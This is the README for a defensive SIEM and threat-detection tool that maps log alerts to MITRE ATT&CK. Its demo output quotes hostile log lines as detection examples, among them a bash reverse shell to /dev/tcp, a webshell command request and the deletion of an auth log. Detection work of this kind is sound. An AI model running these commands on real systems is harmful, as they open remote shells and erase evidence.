<div align="center">

<table><tr><td align="center" bgcolor="#0d1117">

```
 ████████╗██╗  ██╗██████╗ ███████╗ █████╗ ████████╗
 ╚══██╔══╝██║  ██║██╔══██╗██╔════╝██╔══██╗╚══██╔══╝
    ██║   ███████║██████╔╝█████╗  ███████║   ██║   
    ██║   ██╔══██║██╔══██╗██╔══╝  ██╔══██║   ██║   
    ██║   ██║  ██║██║  ██║███████╗██║  ██║   ██║   
    ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   
    H U N T E R  —  S I E M
```

</td></tr></table>

**Lightweight SIEM & Threat Detection Engine**

![Rules](https://img.shields.io/badge/19_Detection_Rules-1f6feb?style=flat-square)
![MITRE](https://img.shields.io/badge/MITRE_ATT%26CK_Mapped-cc0000?style=flat-square)
![Formats](https://img.shields.io/badge/Syslog_%7C_Apache_%7C_JSON-238636?style=flat-square)
![Python](https://img.shields.io/badge/stdlib_only-3776AB?style=flat-square&logo=python&logoColor=white)
![Demo](https://img.shields.io/badge/Attack_Scenario_Demo-ff6600?style=flat-square)

</div>

---

## 🔴 Live Attack Scenario (Demo Mode)

```bash
python threathunter.py --demo
```

Watch a full attack chain unfold in real time:

```
[INFO ] sshd: Accepted publickey for admin from 192.168.1.5

███ [HIGH][10:25:01] Brute Force Login [AUTH-001]
      Category : Authentication
      MITRE    : T1110 — Brute Force
      Log      : Failed password for root from 10.0.0.99 (×3)
      Fix      : Block IP, enable MFA, enforce lockout policy

███ [CRITICAL][10:28:00] Webshell Access [MAL-001]  
      MITRE    : T1505.003 — Server Software Component
      Log      : GET /uploads/c99.php?cmd=id → 200

███ [CRITICAL][10:29:00] Reverse Shell [NET-001]
      MITRE    : T1059 — Command & Scripting Interpreter
      Log      : bash -i >& /dev/tcp/10.0.0.99/4444 0>&1

███ [CRITICAL][10:33:00] Log Clearing [SYS-003]
      MITRE    : T1070 — Indicator Removal
      Log      : rm /var/log/auth.log
```

---

## 📋 All 19 Detection Rules

<details>
<summary><b>Authentication (5 rules)</b></summary>

| ID | Rule | MITRE |
|---|---|---|
| AUTH-001 | Brute Force Login | T1110 |
| AUTH-002 | Sudo / Root Execution | T1548 |
| AUTH-003 | SSH Key Auth Failure | T1110.004 |
| AUTH-004 | New User Created | T1136 |
| AUTH-005 | Password Changed | T1531 |

</details>

<details>
<summary><b>Network (3 rules)</b></summary>

| ID | Rule | MITRE |
|---|---|---|
| NET-001 | Reverse Shell Pattern | T1059 |
| NET-002 | Port Scan Tool | T1046 |
| NET-003 | DNS Tunneling | T1071.004 |

</details>

<details>
<summary><b>Malware / Execution (4 rules)</b></summary>

| ID | Rule | MITRE |
|---|---|---|
| MAL-001 | Webshell Access | T1505.003 |
| MAL-002 | Base64 Encoded Payload | T1027 |
| MAL-003 | Cron Persistence | T1053 |
| MAL-004 | Suspicious Download | T1105 |

</details>

<details>
<summary><b>Web Attacks (4 rules) + System (3 rules)</b></summary>

WEB-001 SQL Injection · WEB-002 XSS · WEB-003 Path Traversal · WEB-004 Scanner  
SYS-001 SUID Abuse · SYS-002 Firewall Disabled · SYS-003 Log Clearing

</details>

---

## 🚀 Usage

```bash
git clone https://github.com/SRINIVASAN55/ThreatHunter-SIEM
cd ThreatHunter-SIEM

python threathunter.py --demo                              # Attack scenario
python threathunter.py -f sample_logs/auth.log             # Analyze log file
python threathunter.py -f /var/log/auth.log --tail         # Live monitoring
python threathunter.py -f auth.log -f web_access.log       # Multi-file
```

---

## 📊 HTML Dashboard Output

After every scan, an HTML dashboard is generated with:
- Severity badge summary (CRITICAL / HIGH / MEDIUM / LOW)
- Category breakdown (Auth, Webshell, Network…)
- Per-alert table with MITRE IDs, source IPs, log preview
- Remediation guidance per finding

---

<p align="center">
Built by <a href="https://github.com/SRINIVASAN55">SRINIVASAN55</a> ·
<a href="https://linkedin.com/in/srinivasan132">LinkedIn</a>
</p>
